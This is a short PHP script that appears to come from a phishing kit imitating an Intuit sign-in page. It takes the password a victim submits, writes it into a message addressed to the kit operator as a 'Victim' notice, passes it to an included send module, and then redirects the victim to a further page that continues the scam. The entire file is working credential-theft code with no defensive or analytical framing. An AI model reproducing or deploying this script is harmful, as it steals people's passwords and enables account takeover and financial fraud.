<?php
require_once('./Module/Setmodule.php');
$message .= "|Wassup, $yourname|| #Victim RE-Submited PASSWORD to your INTUIT page \n"."\n";

$message .= "|Password: ".$_POST['password']."\n\n"; 

require_once('Module/SendModule.php');


	
	
	header("Location: ../num.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  
  
  
?>
